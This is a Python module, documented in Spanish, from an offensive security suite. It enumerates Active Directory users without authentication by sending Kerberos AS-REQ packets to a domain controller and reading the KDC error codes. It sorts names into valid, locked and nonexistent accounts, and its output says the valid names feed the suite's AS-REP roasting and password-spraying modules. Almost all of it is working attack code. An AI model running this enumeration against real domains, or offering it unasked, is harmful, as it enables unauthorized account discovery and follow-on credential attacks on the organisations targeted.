# -*- coding: utf-8 -*-
"""
Módulo ad/kerberos_userenum
===========================
Enumeración de usuarios por Kerberos (estilo kerbrute) sin autenticarse:
un AS-REQ sin preautenticación produce respuestas distintas para usuarios
existentes (KDC_ERR_PREAUTH_REQUIRED = 25) e inexistentes
(KDC_ERR_C_PRINCIPAL_UNKNOWN = 6). Cliente Kerberos propio (core.krb5).

Ideas de: kerbrute · goteo (motor Kerberos de la suite).

Riesgo: MEDIO (genera un AS-REQ por usuario; los DC lo registran como
evento 4768 con fallo 0x6). ATT&CK: T1087.002.
"""

import socket

from core.base_module import BaseModulo, ModuloError
from core import krb5


def cargar_lista(texto: str):
    """Carga una lista desde texto directo (comas/espacios/saltos) o fichero @ruta."""
    texto = texto.strip()
    if texto.startswith("@"):
        ruta = texto[1:]
        try:
            contenido = open(ruta, encoding="utf-8").read()
        except OSError as err:
            raise ModuloError(f"No se pudo leer la lista {ruta}: {err}")
    else:
        contenido = texto
    items = []
    for trozo in contenido.replace("\n", ",").replace(" ", ",").split(","):
        trozo = trozo.strip()
        if trozo and trozo not in items:
            items.append(trozo)
    return items


class KerberosUserEnum(BaseModulo):
    """Enumera usuarios de dominio por diferencia de errores del KDC."""

    NAME = "ad/kerberos_userenum"
    CATEGORIA = "ad"
    DESCRIPCION = ("Enumera usuarios de dominio vía AS-REQ Kerberos (estilo kerbrute): "
                   "PREAUTH_REQUIRED=25 existe · C_PRINCIPAL_UNKNOWN=6 no existe. "
                   "Cliente Kerberos propio, sin autenticación.")
    RIESGO = "medio"
    AUTOR = "REDHAVOC"
    REFERENCIA = "kerbrute · goteo (suite propia) · MITRE ATT&CK T1087.002"
    ATTCK = ("T1087.002",)

    def definir_opciones(self) -> None:
        self.opciones.declarar("RHOST", "", True, "IP o nombre del controlador de dominio (KDC)")
        self.opciones.declarar("REINO", "", True, "Reino Kerberos en MAYÚSCULAS (p. ej. CORP.LOCAL)")
        self.opciones.declarar("USUARIOS", "", True,
                               "Lista separada por comas o fichero @ruta (uno por línea)")
        self.opciones.declarar("PUERTO", "88", False, "Puerto del KDC")
        self.opciones.declarar("TCP", "false", False, "Usar TCP en vez de UDP (AS-REP grandes)")

    def ejecutar(self) -> dict:
        host = self._objetivo_host(self.opt("RHOST"))
        reino = self.opt("REINO").strip().upper()
        usuarios = cargar_lista(self.opt("USUARIOS"))
        if not usuarios:
            raise ModuloError("Lista de usuarios vacía")
        puerto = self.opt_int("PUERTO", 88) or 88
        tcp = self.opt_bool("TCP")
        timeout = self.opt_int("TIMEOUT", 5) or 5

        validos, inexistentes, bloqueados, errores = [], [], [], []
        for usuario in usuarios:
            paquete = krb5.construir_as_req(usuario, reino, etipo=23)
            try:
                respuesta = krb5.enviar_kdc(host, paquete, timeout=timeout,
                                            tcp=tcp, puerto=puerto)
            except (socket.timeout, TimeoutError):
                errores.append({"usuario": usuario, "error": "timeout"})
                continue
            except OSError as err:
                errores.append({"usuario": usuario, "error": str(err)})
                continue
            resultado = krb5.interpretar_respuesta(respuesta, usuario, reino)
            if resultado["tipo"] == "asrep":
                validos.append(usuario)   # existe y ni siquiera pide preauth
            elif resultado["tipo"] == "error":
                codigo = resultado.get("codigo")
                if codigo == krb5.KDC_ERR_PREAUTH_REQUIRED:
                    validos.append(usuario)
                elif codigo == krb5.KDC_ERR_CLIENT_REVOKED:
                    bloqueados.append(usuario)
                elif codigo == krb5.KDC_ERR_C_PRINCIPAL_UNKNOWN:
                    inexistentes.append(usuario)
                else:
                    errores.append({"usuario": usuario,
                                    "error": resultado.get("motivo", str(codigo))})
            else:
                errores.append({"usuario": usuario, "error": "respuesta ilegible"})

        if not (validos or bloqueados or errores):
            raise ModuloError("Ninguna respuesta interpretable del KDC "
                              "(¿reino correcto? ¿el host es un DC?)")

        db = self.workspace
        if db is not None:
            try:
                db.add_host(host, notas=f"KDC {reino}")
                db.add_service(host, puerto, "KERBEROS")
            except Exception:  # noqa: BLE001 — la enumeración no falla por la DB
                pass

        return {
            "resumen": (f"{reino}: {len(validos)} usuarios válidos, "
                        f"{len(bloqueados)} bloqueados, {len(inexistentes)} inexistentes "
                        f"({len(errores)} errores)"),
            "reino": reino,
            "validos": validos,
            "bloqueados": bloqueados,
            "inexistentes": inexistentes,
            "errores": errores,
            "nota": "Los usuarios válidos alimentan ad/asreproast y ad/passwd_spray.",
        }
